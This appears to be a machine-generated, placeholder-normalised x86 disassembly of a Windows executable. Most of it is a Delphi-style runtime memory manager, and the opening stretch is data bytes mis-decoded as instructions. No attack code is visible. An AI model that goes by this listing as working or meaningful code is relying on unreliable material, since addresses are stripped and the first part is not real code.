sub_4010f4
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
mov eax eax
or [ ecx ] dl
inc eax
add [ edx ] cl
push es
push ebx
je r-xdata
add al 0xf8
je r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 4 + 0x11 ] si
inc eax
add [ edi ] al
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
and al 0x11
inc eax
add [ edi + eax ] cl
push esi
popad
inc esp
and al 0x4
clc
jmp sub_405ab4
insd
add [ eax ] al
mov eax 0xf004011
or cl [ ecx + 0x49 ]
outsb
je r-xdata
je r-xdata
popad
outsb
je r-xdata
jmp sub_405adc
jb r-xdata
lea eax [ eax ]
xor al 0x11
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 4 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
add al al
adc [ eax ] al
add al 0x6
inc esp
outsd
jne r-xdata
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
inc eax
add [ ecx + edx ] dh
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405af0
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
popad
outsb
je r-xdata
jb r-xdata
insb
add [ gs : ebp + 0x10d00040 ] ecx
inc eax
add [ eax + ecx ] al
add [ eax ] al
add [ eax ] al
inc esi
xor eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12b00040 ] cl
inc eax
add [ ecx + 0x12 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004012 ] dh
add [ eax ] al
add [ eax + 0x11 ] al
inc eax
add [ esp + esi + 0x5a880040 ] bl
inc eax
add [ edx + ebx * 2 + 0x34b00040 ] dl
inc eax
add [ esp + esi + 0x5aa40040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
inc esp
xor al [ eax ]
adc [ ecx + ecx * 2 + 0x6e ] edx
je r-xdata
je r-xdata
inc ebx
jne r-xdata
adc [ eax ] al
add al 0x8
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xor al 0x40
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] cl
jb r-xdata
sar bh 0x25
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add eax [ eax ]
imul esp [ ecx + 0x6e ] 0x40118c74
add [ eax ] al
add [ eax ] al
outsb
arpl [ ecx + 0x4 ] di
nop
loopne r-xdata
[ ecx ] ecx
mov eax eax
jmp [ __import_lookup_table_1(user32:CharNextA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
enter 0x4012 0x0
adc [ ebx ] ecx
push esp
inc edx
outsd
jne r-xdata
cmp bh 0xff
inc eax
add [ ebx ] al
or [ edi + 0x6f ] dl
jb r-xdata
and eax __import_lookup_table_0(kernel32:FindClose)
mov eax eax
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx ] ss
inc eax
add [ eax + eax ] al
inc edx
outsd
outsd
insb
add al [ eax ]
add [ eax ] al
and eax __import_lookup_table_0(kernel32:FindFirstFileA)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_40135c
add [ eax ] al
add [ eax ] al
je r-xdata
dec ecx
add [ ebx - 0x23da0040 ] cl
and [ ecx ] ecx
mov eax eax
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
insd
sub_401478
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401438
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4014d0
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401478
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401518
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401500
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401500
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4014d0
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401588
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4014d0
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401500
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40161c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014d0
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401448
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401450
xor eax eax
mov [ ebx ] eax
sub_401680
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401448
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401448
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4014d0
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401450
xor eax eax
mov [ ebx ] eax
sub_4016f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401450
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401500
mov [ rw-data ] 0x1
sub_4017b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401448
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_401844
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401450
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4018c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_40161c
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4017b0
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401518
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016f8
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401500
jmp r-xdata
sub_401954
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401680
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401518
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401680
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016f8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401518
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4017b0
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016f8
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401500
jmp r-xdata
sub_401a78
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_401844
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401518
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016f8
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401588
jmp r-xdata
sub_401b04
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401bba
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401458
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4014c8
mov eax rw-data
call sub_4014c8
mov eax rw-data
call sub_4014c8
push 0xff8
push 0x0
call sub_401438
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401460
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401bc1
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401468
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401bc8
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c9e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401460
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401450
mov ebx [ ebx ]
mov eax rw-data
call sub_4014c8
mov eax rw-data
call sub_4014c8
mov eax rw-data
call sub_4014c8
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401470
retn
push rw-data
call sub_401468
sub_401ca8
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401d0c
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401d3c
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401f10
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d90
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d6c
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401db8
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ca8
add ebx esi
mov [ rw-data ] 0x6
sub_401e28
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ca8
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e60
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401d0c
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a78
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a78
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401d3c
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401588
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d90
sub_401f10
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e60
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f98
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d6c
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401fe4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f98
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401518
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401db8
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401e28
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401d3c
sub [ edi + 0x4 ] 0x4
sub_402070
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4018c4
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fe4
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_40209c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_401954
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401fe4
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_4020d0
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020fc
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ca8
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401f10
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402070
test al al
jne r-xdata
mov eax esi
call sub_4020d0
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4021f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401b04
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_40236c
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401460
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020fc
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401468
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a8c
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
